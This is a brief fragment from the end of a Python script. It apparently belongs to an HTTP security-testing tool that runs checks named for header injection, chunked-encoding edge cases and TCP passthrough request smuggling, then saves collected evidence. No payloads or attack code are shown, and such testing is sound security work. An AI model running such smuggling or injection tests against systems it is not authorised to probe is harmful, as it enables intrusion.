        test_chunked_edge_cases()
        test_header_injection()
        test_method_uri_parsing()
        test_tcp_passthrough_smuggling()
        test_content_type_headers()
    except Exception as e:
        print(f"\n[!] Error during testing: {e}")
        traceback.print_exc()
    finally:
        evidence.save()
